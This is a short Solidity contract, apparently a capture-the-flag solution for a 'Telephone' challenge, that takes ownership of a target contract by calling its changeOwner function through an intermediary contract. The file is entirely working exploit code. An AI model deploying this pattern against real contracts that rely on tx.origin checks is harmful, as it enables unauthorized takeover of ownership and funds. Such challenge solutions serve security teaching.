// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ITelephone} from "../interfaces/ITelephone.sol";

contract TelephoneAttack {
    ITelephone public immutable target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address newOwner) external {
        target.changeOwner(newOwner);
    }
}
